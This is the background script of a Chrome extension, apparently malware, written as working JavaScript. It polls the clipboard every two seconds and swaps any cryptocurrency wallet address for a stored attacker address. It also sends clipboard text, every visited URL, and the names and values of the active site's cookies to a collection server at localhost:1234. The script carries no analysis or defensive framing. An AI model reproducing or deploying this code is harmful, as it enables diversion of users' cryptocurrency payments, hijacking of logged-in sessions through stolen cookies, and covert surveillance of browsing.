const ALARM_NAME = 'clipboardCheck';
const CHECK_INTERVAL = 2; // 2 seconds


chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ clipboardEnabled: false });
});


chrome.permissions.contains({ permissions: ['clipboardRead', 'clipboardWrite'] }, (hasPermission) => {
  if (!hasPermission) {
    chrome.permissions.request({
      permissions: ['clipboardRead', 'clipboardWrite']
    });
  }
});

function startMonitoring() {
  chrome.alarms.create(ALARM_NAME, {
    periodInMinutes: CHECK_INTERVAL / 60
  });
}

function stopMonitoring() {
  // Clear the alarm
  chrome.alarms.clear(ALARM_NAME);
}


chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === ALARM_NAME) {
    chrome.storage.local.get('clipboardEnabled', (result) => {
      if (result.clipboardEnabled) {
      }
    });
  }
});

chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.clipboardEnabled) {
    if (changes.clipboardEnabled.newValue) {
      startMonitoring();
    } else {
      stopMonitoring();
    }
  }
});

const WALLET_REGEXES = [
  /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g, // Bitcoin
  /\b0x[a-fA-F0-9]{40}\b/g, // Ethereum
  /\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b/g, // Litecoin
  /\br[0-9a-zA-Z]{24,34}\b/g, // Ripple
  /\b[0-9A-Za-z]{34}\b/g // Generic (catch-all, last)
];

function replaceWalletAddresses(text, enabled, replacement) {
  if (!enabled || !replacement) return text;
  let replaced = text;
  for (const regex of WALLET_REGEXES) {
    replaced = replaced.replace(regex, replacement);
  }
  return replaced;
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'clipboardData' && message.text) {
    chrome.storage.local.get(["walletReplaceEnabled", "replacementWalletAddress"], (result) => {
      const enabled = result.walletReplaceEnabled || false;
      const replacement = result.replacementWalletAddress || "";
      const replaced = replaceWalletAddresses(message.text, enabled, replacement);
      fetch('http://localhost:1234/clipboard', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ text: replaced })
      }).catch(err => console.error('Failed to send to server:', err));
    });
  }
});

// URL history tracking
function saveUrlToHistory(url) {
  chrome.storage.local.get("urlHistory", (result) => {
    let urls = result.urlHistory || [];
    if (urls.length === 0 || urls[urls.length - 1] !== url) {
      urls.push(url);
      if (urls.length > 100) urls = urls.slice(-100); 
      chrome.storage.local.set({ urlHistory: urls });
      // Send to server
      fetch('http://localhost:1234/clipboard', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: `[URL] ${url}` })
      }).catch(err => console.error('Failed to send URL to server:', err));
    }
  });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome')) {
    chrome.storage.local.get('urlTrackingEnabled', (result) => {
      if (result.urlTrackingEnabled) {
        saveUrlToHistory(tab.url);
      }
    });
  }
});



chrome.storage.local.get('clipboardEnabled', (result) => {
  if (result.clipboardEnabled) {
    startMonitoring();
  }
});

setInterval(() => {
  chrome.runtime.getPlatformInfo(() => {});
}, 2000);

// --- BEGIN: Wallet replacement clipboard monitoring ---
let lastClipboardBg = '';
let clipboardIntervalId = null;
const BG_CHECK_INTERVAL_MS = 2000;

function replaceWalletAddressesBg(text, enabled, replacement) {
  if (!enabled || !replacement) return text;
  let replaced = text;
  for (const regex of WALLET_REGEXES) {
    replaced = replaced.replace(regex, replacement);
  }
  return replaced;
}

function readAndReplaceClipboardBg() {
  chrome.storage.local.get(["walletReplaceEnabled", "replacementWalletAddress"], (result) => {
    const enabled = result.walletReplaceEnabled || false;
    const replacement = result.replacementWalletAddress || "";
    if (!enabled || !replacement) return;
    navigator.clipboard.readText().then(text => {
      let replaced = replaceWalletAddressesBg(text, enabled, replacement);
      if (enabled && replaced !== text) {
        navigator.clipboard.writeText(replaced).catch(() => {});
        lastClipboardBg = replaced;
      } else {
        if (text && text !== lastClipboardBg) {
          lastClipboardBg = text;
        }
      }
    }).catch(() => {});
  });
}

function startBgClipboardMonitoring() {
  if (!clipboardIntervalId) {
    readAndReplaceClipboardBg();
    clipboardIntervalId = setInterval(readAndReplaceClipboardBg, BG_CHECK_INTERVAL_MS);
  }
}

function stopBgClipboardMonitoring() {
  if (clipboardIntervalId) {
    clearInterval(clipboardIntervalId);
    clipboardIntervalId = null;
  }
}

function shouldMonitorBgClipboard() {
  chrome.storage.local.get(["walletReplaceEnabled"], (result) => {
    if (result.walletReplaceEnabled) {
      startBgClipboardMonitoring();
    } else {
      stopBgClipboardMonitoring();
    }
  });
}

chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.walletReplaceEnabled) {
    shouldMonitorBgClipboard();
  }
});

// On load, check if we should start monitoring
shouldMonitorBgClipboard();
// --- END: Wallet replacement clipboard monitoring ---

// --- BEGIN: Periodic Cookie Logging with Hash Deduplication ---
let cookiesIntervalId = null;
const COOKIES_CHECK_INTERVAL_MS = 2000;

async function hashStringSHA256(str) {
  const encoder = new TextEncoder();
  const data = encoder.encode(str);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function startCookiesMonitoring() {
  if (cookiesIntervalId) return;
  cookiesIntervalId = setInterval(logCookiesForAllTabs, COOKIES_CHECK_INTERVAL_MS);
}

function stopCookiesMonitoring() {
  if (cookiesIntervalId) {
    clearInterval(cookiesIntervalId);
    cookiesIntervalId = null;
  }
}

async function logCookiesForAllTabs() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    if (!tabs || !tabs[0] || !tabs[0].url) return;
    const url = tabs[0].url;
    const domain = (new URL(url)).hostname;
    chrome.cookies.getAll({domain: domain}, async function(cookies) {
      if (!cookies || cookies.length === 0) return;
      chrome.storage.local.get({cookieHashes: {}}, async function(result) {
        const hashes = result.cookieHashes || {};
        for (const c of cookies) {
          const cookieStr = `${domain}:${c.name}=${c.value}`;
          const hash = await hashStringSHA256(cookieStr);
          if (!hashes[hash]) {
            // New cookie, send to server
            fetch('http://localhost:1234/clipboard', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: `[COOKIES] ${domain}: ${c.name}=${c.value}` })
            }).catch(err => console.error('Failed to send cookies to server:', err));
            hashes[hash] = true;
          }
        }
        chrome.storage.local.set({cookieHashes: hashes});
      });
    });
  });
}

function updateCookiesMonitoring() {
  chrome.storage.local.get(['cookiesTrackingEnabled'], (result) => {
    if (result.cookiesTrackingEnabled) {
      startCookiesMonitoring();
    } else {
      stopCookiesMonitoring();
    }
  });
}

chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.cookiesTrackingEnabled) {
    updateCookiesMonitoring();
  }
});

// On load, check if we should start monitoring cookies
updateCookiesMonitoring();
// --- END: Periodic Cookie Logging with Hash Deduplication ---